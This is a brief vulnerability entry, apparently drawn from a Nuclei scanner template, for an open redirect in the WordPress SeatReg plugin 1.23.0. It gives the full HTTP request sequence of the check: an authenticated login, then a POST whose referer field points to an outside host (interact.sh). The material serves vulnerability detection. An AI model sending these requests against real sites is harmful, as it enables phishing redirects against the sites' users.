# Vulnerability: WordPress Plugin ‘SeatReg’ - Open Redirect
**Classification:** REDIRECT
**Source:** Nuclei Template (`seatreg-redirect.yaml`)

## Description
WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=seatreg-welcome HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/admin-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new-registration-name=test&action=seatreg_create_submit&seatreg-admin-nonce={{seatreg-admin-nonce}}&_wp_http_referer=http://interact.sh&submit=Create+new+registration
```

